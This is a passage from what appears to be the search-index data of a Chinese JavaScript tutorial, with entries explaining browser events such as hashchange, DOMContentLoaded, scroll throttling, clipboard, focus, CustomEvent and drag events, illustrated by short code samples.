\u53f7\u540e\u9762\u7684\u90e8\u5206\uff0c\u5305\u62ec # \u53f7\uff09\u53d1\u751f\u53d8\u5316\u65f6\u89e6\u53d1\u3002\u8be5\u4e8b\u4ef6\u4e00\u822c\u5728 window \u5bf9\u8c61\u4e0a\u76d1\u542c\u3002 hashchange \u7684\u4e8b\u4ef6\u5b9e\u4f8b\u5177\u6709\u4e24\u4e2a\u7279\u6709\u5c5e\u6027\uff1a oldURL \u5c5e\u6027\u548c newURL \u5c5e\u6027\uff0c\u5206\u522b\u8868\u793a\u53d8\u5316\u524d\u540e\u7684\u5b8c\u6574 URL\u3002 1 2 3 4 5 6 7 8 9 10 11 // URL \u662f http://www.example.com/ window . addEventListener ( 'hashchange' , myFunction ); function myFunction ( e ) { console . log ( e . oldURL ); console . log ( e . newURL ); } location . hash = 'part2' ; // http://www.example.com/ // http://www.example.com/#part2","title":"hashchange \u4e8b\u4ef6"},{"location":"events/common/#_3","text":"","title":"\u7f51\u9875\u72b6\u6001\u4e8b\u4ef6"},{"location":"events/common/#domcontentloaded","text":"\u7f51\u9875\u4e0b\u8f7d\u5e76\u89e3\u6790\u5b8c\u6210\u4ee5\u540e\uff0c\u6d4f\u89c8\u5668\u5c31\u4f1a\u5728 document \u5bf9\u8c61\u4e0a\u89e6\u53d1 DOMContentLoaded \u4e8b\u4ef6\u3002\u8fd9\u65f6\uff0c\u4ec5\u4ec5\u5b8c\u6210\u4e86\u7f51\u9875\u7684\u89e3\u6790\uff08\u6574\u5f20\u9875\u9762\u7684 DOM \u751f\u6210\u4e86\uff09\uff0c\u6240\u6709\u5916\u90e8\u8d44\u6e90\uff08\u6837\u5f0f\u8868\u3001\u811a\u672c\u3001iframe \u7b49\u7b49\uff09\u53ef\u80fd\u8fd8\u6ca1\u6709\u4e0b\u8f7d\u7ed3\u675f\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u8fd9\u4e2a\u4e8b\u4ef6\u6bd4 load \u4e8b\u4ef6\uff0c\u53d1\u751f\u65f6\u95f4\u65e9\u5f97\u591a\u3002 1 2 3 document . addEventListener ( 'DOMContentLoaded' , function ( event ) { console . log ( 'DOM\u751f\u6210' ); }); \u6ce8\u610f\uff0c\u7f51\u9875\u7684 JavaScript \u811a\u672c\u662f\u540c\u6b65\u6267\u884c\u7684\uff0c\u811a\u672c\u4e00\u65e6\u53d1\u751f\u5835\u585e\uff0c\u5c06\u63a8\u8fdf\u89e6\u53d1 DOMContentLoaded \u4e8b\u4ef6\u3002 1 2 3 4 5 6 7 8 document . addEventListener ( 'DOMContentLoaded' , function ( event ) { console . log ( 'DOM \u751f\u6210' ); }); // \u8fd9\u6bb5\u4ee3\u7801\u4f1a\u63a8\u8fdf\u89e6\u53d1 DOMContentLoaded \u4e8b\u4ef6 for ( var i = 0 ; i < 1000000000 ; i ++ ) { // ... }","title":"DOMContentLoaded \u4e8b\u4ef6"},{"location":"events/common/#readystatechange","text":"readystatechange \u4e8b\u4ef6\u5f53 Document \u5bf9\u8c61\u548c XMLHttpRequest \u5bf9\u8c61\u7684 readyState \u5c5e\u6027\u53d1\u751f\u53d8\u5316\u65f6\u89e6\u53d1\u3002 document.readyState \u6709\u4e09\u4e2a\u53ef\u80fd\u7684\u503c\uff1a loading \uff08\u7f51\u9875\u6b63\u5728\u52a0\u8f7d\uff09\u3001 interactive \uff08\u7f51\u9875\u5df2\u7ecf\u89e3\u6790\u5b8c\u6210\uff0c\u4f46\u662f\u5916\u90e8\u8d44\u6e90\u4ecd\u7136\u5904\u5728\u52a0\u8f7d\u72b6\u6001\uff09\u548c complete \uff08\u7f51\u9875\u548c\u6240\u6709\u5916\u90e8\u8d44\u6e90\u5df2\u7ecf\u7ed3\u675f\u52a0\u8f7d\uff0c load \u4e8b\u4ef6\u5373\u5c06\u89e6\u53d1\uff09\u3002 1 2 3 4 5 document . onreadystatechange = function () { if ( document . readyState === 'interactive' ) { // ... } } \u8fd9\u4e2a\u4e8b\u4ef6\u53ef\u4ee5\u770b\u4f5c DOMContentLoaded \u4e8b\u4ef6\u7684\u53e6\u4e00\u79cd\u5b9e\u73b0\u65b9\u6cd5\u3002","title":"readystatechange \u4e8b\u4ef6"},{"location":"events/common/#_4","text":"","title":"\u7a97\u53e3\u4e8b\u4ef6"},{"location":"events/common/#scroll","text":"scroll \u4e8b\u4ef6\u5728\u6587\u6863\u6216\u6587\u6863\u5143\u7d20\u6eda\u52a8\u65f6\u89e6\u53d1\uff0c\u4e3b\u8981\u51fa\u73b0\u5728\u7528\u6237\u62d6\u52a8\u6eda\u52a8\u6761\u3002 1 window . addEventListener ( 'scroll' , callback ); \u8be5\u4e8b\u4ef6\u4f1a\u8fde\u7eed\u5730\u5927\u91cf\u89e6\u53d1\uff0c\u6240\u4ee5\u5b83\u7684\u76d1\u542c\u51fd\u6570\u4e4b\u4e2d\u4e0d\u5e94\u8be5\u6709\u975e\u5e38\u8017\u8d39\u8ba1\u7b97\u7684\u64cd\u4f5c\u3002\u63a8\u8350\u7684\u505a\u6cd5\u662f\u4f7f\u7528 requestAnimationFrame \u6216 setTimeout \u63a7\u5236\u8be5\u4e8b\u4ef6\u7684\u89e6\u53d1\u9891\u7387\uff0c\u7136\u540e\u53ef\u4ee5\u7ed3\u5408 customEvent \u629b\u51fa\u4e00\u4e2a\u65b0\u4e8b\u4ef6\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 ( function () { var throttle = function ( type , name , obj ) { var obj = obj || window ; var running = false ; var func = function () { if ( running ) { return ; } running = true ; requestAnimationFrame ( function () { obj . dispatchEvent ( new CustomEvent ( name )); running = false ; }); }; obj . addEventListener ( type , func ); }; // \u5c06 scroll \u4e8b\u4ef6\u8f6c\u4e3a optimizedScroll \u4e8b\u4ef6 throttle ( 'scroll' , 'optimizedScroll' ); })(); window . addEventListener ( 'optimizedScroll' , function () { console . log ( 'Resource conscious scroll callback!' ); }); \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c throttle() \u51fd\u6570\u7528\u4e8e\u63a7\u5236\u4e8b\u4ef6\u89e6\u53d1\u9891\u7387\uff0c\u5b83\u6709\u4e00\u4e2a\u5185\u90e8\u51fd\u6570 func() \uff0c\u6bcf\u6b21 scroll \u4e8b\u4ef6\u5b9e\u9645\u4e0a\u89e6\u53d1\u7684\u662f\u8fd9\u4e2a\u51fd\u6570\u3002 func() \u51fd\u6570\u5185\u90e8\u4f7f\u7528 requestAnimationFrame() \u65b9\u6cd5\uff0c\u4fdd\u8bc1\u53ea\u6709\u6bcf\u6b21\u9875\u9762\u91cd\u7ed8\u65f6\uff08\u6bcf\u79d260\u6b21\uff09\uff0c\u624d\u53ef\u80fd\u4f1a\u89e6\u53d1 optimizedScroll \u4e8b\u4ef6\uff0c\u4ece\u800c\u5b9e\u9645\u4e0a\u5c06 scroll \u4e8b\u4ef6\u8f6c\u6362\u4e3a optimizedScroll \u4e8b\u4ef6\uff0c\u89e6\u53d1\u9891\u7387\u88ab\u63a7\u5236\u5728\u6bcf\u79d2\u6700\u591a60\u6b21\u3002 \u6539\u7528 setTimeout() \u65b9\u6cd5\uff0c\u53ef\u4ee5\u653e\u7f6e\u66f4\u5927\u7684\u65f6\u95f4\u95f4\u9694\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 ( function () { window . addEventListener ( 'scroll' , scrollThrottler , false ); var scrollTimeout ; function scrollThrottler () { if ( ! scrollTimeout ) { scrollTimeout = setTimeout ( function () { scrollTimeout = null ; actualScrollHandler (); }, 66 ); } } function actualScrollHandler () { // ... } }()); \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u6bcf\u6b21 scroll \u4e8b\u4ef6\u90fd\u4f1a\u6267\u884c scrollThrottler \u51fd\u6570\u3002\u8be5\u51fd\u6570\u91cc\u9762\u6709\u4e00\u4e2a\u5b9a\u65f6\u5668 setTimeout \uff0c\u6bcf66\u6beb\u79d2\u89e6\u53d1\u4e00\u6b21\uff08\u6bcf\u79d215\u6b21\uff09\u771f\u6b63\u6267\u884c\u7684\u4efb\u52a1 actualScrollHandler \u3002 \u4e0b\u9762\u662f\u4e00\u4e2a\u66f4\u4e00\u822c\u7684 throttle \u51fd\u6570\u7684\u5199\u6cd5\u3002 1 2 3 4 5 6 7 8 9 10 11 function throttle ( fn , wait ) { var time = Date . now (); return function () { if (( time + wait - Date . now ()) < 0 ) { fn (); time = Date . now (); } } } window . addEventListener ( 'scroll' , throttle ( callback , 1000 )); \u4e0a\u9762\u7684\u4ee3\u7801\u5c06 scroll \u4e8b\u4ef6\u7684\u89e6\u53d1\u9891\u7387\uff0c\u9650\u5236\u5728\u4e00\u79d2\u4e00\u6b21\u3002 lodash \u51fd\u6570\u5e93\u63d0\u4f9b\u4e86\u73b0\u6210\u7684 throttle \u51fd\u6570\uff0c\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528\u3002 1 window . addEventListener ( 'scroll' , _ . throttle ( callback , 1000 )); \u672c\u4e66\u524d\u9762\u4ecb\u7ecd\u8fc7 debounce \u7684\u6982\u5ff5\uff0c throttle \u4e0e\u5b83\u533a\u522b\u5728\u4e8e\uff0c throttle \u662f\u201c\u8282\u6d41\u201d\uff0c\u786e\u4fdd\u4e00\u6bb5\u65f6\u95f4\u5185\u53ea\u6267\u884c\u4e00\u6b21\uff0c\u800c debounce \u662f\u201c\u9632\u6296\u201d\uff0c\u8981\u8fde\u7eed\u64cd\u4f5c\u7ed3\u675f\u540e\u518d\u6267\u884c\u3002\u4ee5\u7f51\u9875\u6eda\u52a8\u4e3a\u4f8b\uff0c debounce \u8981\u7b49\u5230\u7528\u6237\u505c\u6b62\u6eda\u52a8\u540e\u624d\u6267\u884c\uff0c throttle \u5219\u662f\u5982\u679c\u7528\u6237\u4e00\u76f4\u5728\u6eda\u52a8\u7f51\u9875\uff0c\u90a3\u4e48\u5728\u6eda\u52a8\u8fc7\u7a0b\u4e2d\u8fd8\u662f\u4f1a\u6267\u884c\u3002","title":"scroll \u4e8b\u4ef6"},{"location":"events/common/#resize","text":"resize \u4e8b\u4ef6\u5728\u6539\u53d8\u6d4f\u89c8\u5668\u7a97\u53e3\u5927\u5c0f\u65f6\u89e6\u53d1\uff0c\u4e3b\u8981\u53d1\u751f\u5728 window \u5bf9\u8c61\u4e0a\u9762\u3002 1 2 3 4 5 6 7 var resizeMethod = function () { if ( document . body . clientWidth < 768 ) { console . log ( '\u79fb\u52a8\u8bbe\u5907\u7684\u89c6\u53e3' ); } }; window . addEventListener ( 'resize' , resizeMethod , true ); \u8be5\u4e8b\u4ef6\u4e5f\u4f1a\u8fde\u7eed\u5730\u5927\u91cf\u89e6\u53d1\uff0c\u6240\u4ee5\u6700\u597d\u50cf\u4e0a\u9762\u7684 scroll \u4e8b\u4ef6\u4e00\u6837\uff0c\u901a\u8fc7 throttle \u51fd\u6570\u63a7\u5236\u4e8b\u4ef6\u89e6\u53d1\u9891\u7387\u3002","title":"resize \u4e8b\u4ef6"},{"location":"events/common/#fullscreenchange-fullscreenerror","text":"fullscreenchange \u4e8b\u4ef6\u5728\u8fdb\u5165\u6216\u9000\u51fa\u5168\u5c4f\u72b6\u6001\u65f6\u89e6\u53d1\uff0c\u8be5\u4e8b\u4ef6\u53d1\u751f\u5728 document \u5bf9\u8c61\u4e0a\u9762\u3002 1 2 3 document . addEventListener ( 'fullscreenchange' , function ( event ) { console . log ( document . fullscreenElement ); }); fullscreenerror \u4e8b\u4ef6\u5728\u6d4f\u89c8\u5668\u65e0\u6cd5\u5207\u6362\u5230\u5168\u5c4f\u72b6\u6001\u65f6\u89e6\u53d1\u3002","title":"fullscreenchange \u4e8b\u4ef6\uff0cfullscreenerror \u4e8b\u4ef6"},{"location":"events/common/#_5","text":"\u4ee5\u4e0b\u4e09\u4e2a\u4e8b\u4ef6\u5c5e\u4e8e\u526a\u8d34\u677f\u64cd\u4f5c\u7684\u76f8\u5173\u4e8b\u4ef6\u3002 cut \uff1a\u5c06\u9009\u4e2d\u7684\u5185\u5bb9\u4ece\u6587\u6863\u4e2d\u79fb\u9664\uff0c\u52a0\u5165\u526a\u8d34\u677f\u65f6\u89e6\u53d1\u3002 copy \uff1a\u8fdb\u884c\u590d\u5236\u52a8\u4f5c\u65f6\u89e6\u53d1\u3002 paste \uff1a\u526a\u8d34\u677f\u5185\u5bb9\u7c98\u8d34\u5230\u6587\u6863\u540e\u89e6\u53d1\u3002 \u4e3e\u4f8b\u6765\u8bf4\uff0c\u5982\u679c\u5e0c\u671b\u7981\u6b62\u8f93\u5165\u6846\u7684\u7c98\u8d34\u4e8b\u4ef6\uff0c\u53ef\u4ee5\u4f7f\u7528\u4e0b\u9762\u7684\u4ee3\u7801\u3002 1 inputElement . addEventListener ( 'paste' , e => e . preventDefault ()); \u4e0a\u9762\u7684\u4ee3\u7801\u4f7f\u5f97\u7528\u6237\u65e0\u6cd5\u5728 <input> \u8f93\u5165\u6846\u91cc\u9762\u7c98\u8d34\u5185\u5bb9\u3002 cut \u3001 copy \u3001 paste \u8fd9\u4e09\u4e2a\u4e8b\u4ef6\u7684\u4e8b\u4ef6\u5bf9\u8c61\u90fd\u662f ClipboardEvent \u63a5\u53e3\u7684\u5b9e\u4f8b\u3002 ClipboardEvent \u6709\u4e00\u4e2a\u5b9e\u4f8b\u5c5e\u6027 clipboardData \uff0c\u662f\u4e00\u4e2a DataTransfer \u5bf9\u8c61\uff0c\u5b58\u653e\u526a\u8d34\u7684\u6570\u636e\u3002\u5177\u4f53\u7684 API \u63a5\u53e3\u548c\u64cd\u4f5c\u65b9\u6cd5\uff0c\u8bf7\u53c2\u89c1\u300a\u62d6\u62c9\u4e8b\u4ef6\u300b\u7684 DataTransfer \u5bf9\u8c61\u90e8\u5206\u3002 1 2 3 4 5 document . addEventListener ( 'copy' , function ( e ) { e . clipboardData . setData ( 'text/plain' , 'Hello, world!' ); e . clipboardData . setData ( 'text/html' , '<b>Hello, world!</b>' ); e . preventDefault (); }); \u4e0a\u9762\u7684\u4ee3\u7801\u4f7f\u5f97\u590d\u5236\u8fdb\u5165\u526a\u8d34\u677f\u7684\uff0c\u90fd\u662f\u5f00\u53d1\u8005\u6307\u5b9a\u7684\u6570\u636e\uff0c\u800c\u4e0d\u662f\u7528\u6237\u60f3\u8981\u62f7\u8d1d\u7684\u6570\u636e\u3002","title":"\u526a\u8d34\u677f\u4e8b\u4ef6"},{"location":"events/common/#_6","text":"\u7126\u70b9\u4e8b\u4ef6\u53d1\u751f\u5728\u5143\u7d20\u8282\u70b9\u548c document \u5bf9\u8c61\u4e0a\u9762\uff0c\u4e0e\u83b7\u5f97\u6216\u5931\u53bb\u7126\u70b9\u76f8\u5173\u3002\u5b83\u4e3b\u8981\u5305\u62ec\u4ee5\u4e0b\u56db\u4e2a\u4e8b\u4ef6\u3002 focus \uff1a\u5143\u7d20\u8282\u70b9\u83b7\u5f97\u7126\u70b9\u540e\u89e6\u53d1\uff0c\u8be5\u4e8b\u4ef6\u4e0d\u4f1a\u5192\u6ce1\u3002 blur \uff1a\u5143\u7d20\u8282\u70b9\u5931\u53bb\u7126\u70b9\u540e\u89e6\u53d1\uff0c\u8be5\u4e8b\u4ef6\u4e0d\u4f1a\u5192\u6ce1\u3002 focusin \uff1a\u5143\u7d20\u8282\u70b9\u5c06\u8981\u83b7\u5f97\u7126\u70b9\u65f6\u89e6\u53d1\uff0c\u53d1\u751f\u5728 focus \u4e8b\u4ef6\u4e4b\u524d\u3002\u8be5\u4e8b\u4ef6\u4f1a\u5192\u6ce1\u3002 focusout \uff1a\u5143\u7d20\u8282\u70b9\u5c06\u8981\u5931\u53bb\u7126\u70b9\u65f6\u89e6\u53d1\uff0c\u53d1\u751f\u5728 blur \u4e8b\u4ef6\u4e4b\u524d\u3002\u8be5\u4e8b\u4ef6\u4f1a\u5192\u6ce1\u3002 \u8fd9\u56db\u4e2a\u4e8b\u4ef6\u7684\u4e8b\u4ef6\u5bf9\u8c61\u90fd\u7ee7\u627f\u4e86 FocusEvent \u63a5\u53e3\u3002 FocusEvent \u5b9e\u4f8b\u5177\u6709\u4ee5\u4e0b\u5c5e\u6027\u3002 FocusEvent.target \uff1a\u4e8b\u4ef6\u7684\u76ee\u6807\u8282\u70b9\u3002 FocusEvent.relatedTarget \uff1a\u5bf9\u4e8e focusin \u4e8b\u4ef6\uff0c\u8fd4\u56de\u5931\u53bb\u7126\u70b9\u7684\u8282\u70b9\uff1b\u5bf9\u4e8e focusout \u4e8b\u4ef6\uff0c\u8fd4\u56de\u5c06\u8981\u63a5\u53d7\u7126\u70b9\u7684\u8282\u70b9\uff1b\u5bf9\u4e8e focus \u548c blur \u4e8b\u4ef6\uff0c\u8fd4\u56de null \u3002 \u7531\u4e8e focus \u548c blur \u4e8b\u4ef6\u4e0d\u4f1a\u5192\u6ce1\uff0c\u53ea\u80fd\u5728\u6355\u83b7\u9636\u6bb5\u89e6\u53d1\uff0c\u6240\u4ee5 addEventListener \u65b9\u6cd5\u7684\u7b2c\u4e09\u4e2a\u53c2\u6570\u9700\u8981\u8bbe\u4e3a true \u3002 1 2 3 4 5 6 7 form . addEventListener ( 'focus' , function ( event ) { event . target . style . background = 'pink' ; }, true ); form . addEventListener ( 'blur' , function ( event ) { event . target . style . background = '' ; }, true ); \u4e0a\u9762\u4ee3\u7801\u9488\u5bf9\u8868\u5355\u7684\u6587\u672c\u8f93\u5165\u6846\uff0c\u63a5\u53d7\u7126\u70b9\u65f6\u8bbe\u7f6e\u80cc\u666f\u8272\uff0c\u5931\u53bb\u7126\u70b9\u65f6\u53bb\u9664\u80cc\u666f\u8272\u3002","title":"\u7126\u70b9\u4e8b\u4ef6"},{"location":"events/common/#customevent","text":"CustomEvent \u63a5\u53e3\u7528\u4e8e\u751f\u6210\u81ea\u5b9a\u4e49\u7684\u4e8b\u4ef6\u5b9e\u4f8b\u3002\u90a3\u4e9b\u6d4f\u89c8\u5668\u9884\u5b9a\u4e49\u7684\u4e8b\u4ef6\uff0c\u867d\u7136\u53ef\u4ee5\u624b\u52a8\u751f\u6210\uff0c\u4f46\u662f\u5f80\u5f80\u4e0d\u80fd\u5728\u4e8b\u4ef6\u4e0a\u7ed1\u5b9a\u6570\u636e\u3002\u5982\u679c\u9700\u8981\u5728\u89e6\u53d1\u4e8b\u4ef6\u7684\u540c\u65f6\uff0c\u4f20\u5165\u6307\u5b9a\u7684\u6570\u636e\uff0c\u5c31\u53ef\u4ee5\u4f7f\u7528 CustomEvent \u63a5\u53e3\u751f\u6210\u7684\u81ea\u5b9a\u4e49\u4e8b\u4ef6\u5bf9\u8c61\u3002 \u6d4f\u89c8\u5668\u539f\u751f\u63d0\u4f9b CustomEvent() \u6784\u9020\u51fd\u6570\uff0c\u7528\u6765\u751f\u6210 CustomEvent \u4e8b\u4ef6\u5b9e\u4f8b\u3002 1 new CustomEvent ( type , options ) CustomEvent() \u6784\u9020\u51fd\u6570\u63a5\u53d7\u4e24\u4e2a\u53c2\u6570\u3002\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u4e8b\u4ef6\u7684\u540d\u5b57\uff0c\u8fd9\u662f\u5fc5\u987b\u7684\u3002\u7b2c\u4e8c\u4e2a\u53c2\u6570\u662f\u4e8b\u4ef6\u7684\u914d\u7f6e\u5bf9\u8c61\uff0c\u8fd9\u4e2a\u53c2\u6570\u662f\u53ef\u9009\u7684\u3002 CustomEvent \u7684\u914d\u7f6e\u5bf9\u8c61\u9664\u4e86\u63a5\u53d7 Event \u4e8b\u4ef6\u7684\u914d\u7f6e\u5c5e\u6027\uff0c\u53ea\u6709\u4e00\u4e2a\u81ea\u5df1\u7684\u5c5e\u6027\u3002 detail \uff1a\u8868\u793a\u4e8b\u4ef6\u7684\u9644\u5e26\u6570\u636e\uff0c\u9ed8\u8ba4\u4e3a null \u3002 \u4e0b\u9762\u662f\u4e00\u4e2a\u4f8b\u5b50\u3002 1 2 3 4 5 6 7 8 9 10 11 var event = new CustomEvent ( 'build' , { 'detail' : 'hello' }); function eventHandler ( e ) { console . log ( e . detail ); } document . body . addEventListener ( 'build' , function ( e ) { console . log ( e . detail ); }); document . body . dispatchEvent ( event ); \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u6211\u4eec\u624b\u52a8\u5b9a\u4e49\u4e86 build \u4e8b\u4ef6\u3002\u8be5\u4e8b\u4ef6\u89e6\u53d1\u540e\uff0c\u4f1a\u88ab\u76d1\u542c\u5230\uff0c\u4ece\u800c\u8f93\u51fa\u8be5\u4e8b\u4ef6\u5b9e\u4f8b\u7684 detail \u5c5e\u6027\uff08\u5373\u5b57\u7b26\u4e32 hello \uff09\u3002 \u4e0b\u9762\u662f\u53e6\u4e00\u4e2a\u4f8b\u5b50\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 var myEvent = new CustomEvent ( 'myevent' , { detail : { foo : 'bar' }, bubbles : true , cancelable : false }); el . addEventListener ( 'myevent' , function ( event ) { console . log ( 'Hello ' + event . detail . foo ); }); el . dispatchEvent ( myEvent ); \u4e0a\u9762\u4ee3\u7801\u4e5f\u8bf4\u660e\uff0cCustomEvent \u7684\u4e8b\u4ef6\u5b9e\u4f8b\uff0c\u9664\u4e86\u5177\u6709 Event \u63a5\u53e3\u7684\u5b9e\u4f8b\u5c5e\u6027\uff0c\u8fd8\u5177\u6709 detail \u5c5e\u6027\u3002","title":"CustomEvent \u63a5\u53e3"},{"location":"events/drag/","text":"\u62d6\u62c9\u4e8b\u4ef6 \u00b6 \u62d6\u62c9\u4e8b\u4ef6\u7684\u79cd\u7c7b \u00b6 \u62d6\u62c9\uff08drag\uff09\u6307\u7684\u662f\uff0c\u7528\u6237\u5728\u67d0\u4e2a\u5bf9\u8c61\u4e0a\u6309\u4e0b\u9f20\u6807\u952e\u4e0d\u653e\uff0c\u62d6\u52a8\u5b83\u5230\u53e6\u4e00\u4e2a\u4f4d\u7f6e\uff0c\u7136\u540e\u91ca\u653e\u9f20\u6807\u952e\uff0c\u5c06\u8be5\u5bf9\u8c61\u653e\u5728\u90a3\u91cc\u3002 \u62d6\u62c9\u7684\u5bf9\u8c61\u6709\u597d\u51e0\u79cd\uff0c\u5305\u62ec\u5143\u7d20\u8282\u70b9\u3001\u56fe\u7247\u3001\u94fe\u63a5\u3001\u9009\u4e2d\u7684\u6587\u5b57\u7b49\u7b49\u3002\u5728\u7f51\u9875\u4e2d\uff0c\u9664\u4e86\u5143\u7d20\u8282\u70b9\u9ed8\u8ba4\u4e0d\u53ef\u4ee5\u62d6\u62c9\uff0c\u5176\u4ed6\uff08\u56fe\u7247\u3001\u94fe\u63a5\u3001\u9009\u4e2d\u7684\u6587\u5b57\uff09\u90fd\u53ef\u4ee5\u76f4\u63a5\u62d6\u62c9\u3002\u4e3a\u4e86\u8ba9\u5143\u7d20\u8282\u70b9\u53ef\u62d6\u62c9\uff0c\u53ef\u4ee5\u5c06\u8be5\u8282\u70b9\u7684 draggable \u5c5e\u6027\u8bbe\u4e3a true \u3002 1 2 3 < div draggable = \"true\" > \u6b64\u533a\u57df\u53ef\u62d6\u62c9 </ div > \u4e0a\u9762\u4ee3\u7801\u7684 div \u533a\u5757\uff0c\u5728\u7f51\u9875\u4e2d\u53ef\u4ee5\u76f4\u63a5\u7528\u9f20\u6807\u62d6\u52a8\u3002\u677e\u5f00\u9f20\u6807\u952e\u65f6\uff0c\u62d6\u52a8\u6548\u679c\u5c31\u4f1a\u6d88\u5931\uff0c\u8be5\u533a\u5757\u4f9d\u7136\u5728\u539f\u6765\u7684\u4f4d\u7f6e\u3002 draggable \u5c5e\u6027\u53ef\u7528\u4e8e\u4efb\u4f55\u5143\u7d20\u8282\u70b9\uff0c\u4f46\u662f\u56fe\u7247\uff08 <img> \uff09\u548c\u94fe\u63a5\uff08 <a> \uff09\u4e0d\u52a0\u8fd9\u4e2a\u5c5e\u6027\uff0c\u5c31\u53ef\u4ee5\u62d6\u62c9\u3002\u5bf9\u4e8e\u5b83\u4eec\uff0c\u7528\u5230\u8fd9\u4e2a\u5c5e\u6027\u7684\u65f6\u5019\uff0c\u5f80\u5f80\u662f\u5c06\u5176\u8bbe\u4e3a false \uff0c\u9632\u6b62\u62d6\u62c9\u8fd9\u4e24\u79cd\u5143\u7d20\u3002 \u6ce8\u610f\uff0c\u4e00\u65e6\u67d0\u4e2a\u5143\u7d20\u8282\u70b9\u7684 draggable \u5c5e\u6027\u8bbe\u4e3a true \uff0c\u5c31\u65e0\u6cd5\u518d\u7528\u9f20\u6807\u9009\u4e2d\u8be5\u8282\u70b9\u5185\u90e8\u7684\u6587\u5b57\u6216\u5b50\u8282\u70b9\u4e86\u3002 \u5f53\u5143\u7d20\u8282\u70b9\u6216\u9009\u4e2d\u7684\u6587\u672c\u88ab\u62d6\u62c9\u65f6\uff0c\u5c31\u4f1a\u6301\u7eed\u89e6\u53d1\u62d6\u62c9\u4e8b\u4ef6\uff0c\u5305\u62ec\u4ee5\u4e0b\u4e00\u4e9b\u4e8b\u4ef6\u3002 drag \uff1a\u62d6\u62c9\u8fc7\u7a0b\u4e2d\uff0c\u5728\u88ab\u62d6\u62c9\u7684\u8282\u70b9\u4e0a\u6301\u7eed\u89e6\u53d1\uff08\u76f8\u9694\u51e0\u767e\u6beb\u79d2\uff09\u3002 dragstart \uff1a\u7528\u6237\u5f00\u59cb\u62d6\u62c9\u65f6\uff0c\u5728\u88ab\u62d6\u62c9\u7684\u8282\u70b9\u4e0a\u89e6\u53d1\uff0c\u8be5\u4e8b\u4ef6\u7684 target \u5c5e\u6027\u662f\u88ab\u62d6\u62c9\u7684\u8282\u70b9\u3002\u901a\u5e38\u5e94\u8be5\u5728\u8fd9\u4e2a\u4e8b\u4ef6\u7684\u76d1\u542c\u51fd\u6570\u4e2d\uff0c\u6307\u5b9a\u62d6\u62c9\u7684\u6570\u636e\u3002 dragend \uff1a\u62d6\u62c9\u7ed3\u675f\u65f6\uff08\u91ca\u653e\u9f20\u6807\u952e\u6216\u6309\u4e0b ESC \u952e\uff09\u5728\u88ab\u62d6\u62c9\u7684\u8282\u70b9\u4e0a\u89e6\u53d1\uff0c\u8be5\u4e8b\u4ef6\u7684 target \u5c5e\u6027\u662f\u88ab\u62d6\u62c9\u7684\u8282\u70b9\u3002\u5b83\u4e0e dragstart \u4e8b\u4ef6\uff0c\u5728\u540c\u4e00\u4e2a\u8282\u70b9\u4e0a\u89e6\u53d1\u3002\u4e0d\u7ba1\u62d6\u62c9\u662f\u5426\u8de8\u7a97\u53e3\uff0c\u6216\u8005\u4e2d\u9014\u88ab\u53d6\u6d88\uff0c dragend \u4e8b\u4ef6\u603b\u662f\u4f1a\u89e6\u53d1\u7684\u3002 dragenter \uff1a\u62d6\u62c9\u8fdb\u5165\u5f53\u524d\u8282\u70b9\u65f6\uff0c\u5728\u5f53\u524d\u8282\u70b9\u4e0a\u89e6\u53d1\u4e00\u6b21\uff0c\u8be5\u4e8b\u4ef6\u7684 target \u5c5e\u6027\u662f\u5f53\u524d\u8282\u70b9\u3002\u901a\u5e38\u5e94\u8be5\u5728\u8fd9\u4e2a\u4e8b\u4ef6\u7684\u76d1\u542c\u51fd\u6570\u4e2d\uff0c\u6307\u5b9a\u662f\u5426\u5141\u8bb8\u5728\u5f53\u524d\u8282\u70b9\u653e\u4e0b\uff08drop\uff09\u62d6\u62c9\u7684\u6570\u636e\u3002\u5982\u679c\u5f53\u524d\u8282\u70b9\u6ca1\u6709\u8be5\u4e8b\u4ef6\u7684\u76d1\u542c\u51fd\u6570\uff0c\u6216\u8005\u76d1\u542c\u51fd\u6570\u4e0d\u6267\u884c\u4efb\u4f55\u64cd\u4f5c\uff0c\u5c31\u610f\u5473\u7740\u4e0d\u5141\u8bb8\u5728\u5f53\u524d\u8282\u70b9\u653e\u4e0b\u6570\u636e\u3002\u5728\u89c6\u89c9\u4e0a\u663e\u793a\u62d6\u62c9\u8fdb\u5165\u5f53\u524d\u8282\u70b9\uff0c\u4e5f\u662f\u5728\u8fd9\u4e2a\u4e8b\u4ef6\u7684\u76d1\u542c\u51fd\u6570\u4e2d\u8bbe\u7f6e\u3002 dragover \uff1a\u62d6\u62c9\u5230\u5f53\u524d\u8282\u70b9\u4e0a\u65b9\u65f6\uff0c\u5728\u5f53\u524d\u8282\u70b9\u4e0a\u6301\u7eed\u89e6\u53d1\uff08\u76f8\u9694\u51e0\u767e\u6beb\u79d2\uff09\uff0c\u8be5\u4e8b\u4ef6\u7684 target \u5c5e\u6027\u662f\u5f53\u524d\u8282\u70b9\u3002\u8be5\u4e8b\u4ef6\u4e0e dragenter \u4e8b\u4ef6\u7684\u533a\u522b\u662f\uff0c dragenter \u4e8b\u4ef6\u5728\u8fdb\u5165\u8be5\u8282\u70b9\u65f6\u89e6\u53d1\uff0c\u7136\u540e\u53ea\u8981\u6ca1\u6709\u79bb\u5f00\u8fd9\u4e2a\u8282\u70b9\uff0c dragover \u4e8b\u4ef6\u4f1a\u6301\u7eed\u89e6\u53d1\u3002 dragleave \uff1a\u62d6\u62c9\u64cd\u4f5c\u79bb\u5f00\u5f53\u524d\u8282\u70b9\u8303\u56f4\u65f6\uff0c\u5728\u5f53\u524d\u8282\u70b9\u4e0a\u89e6\u53d1\uff0c\u8be5\u4e8b\u4ef6\u7684 target 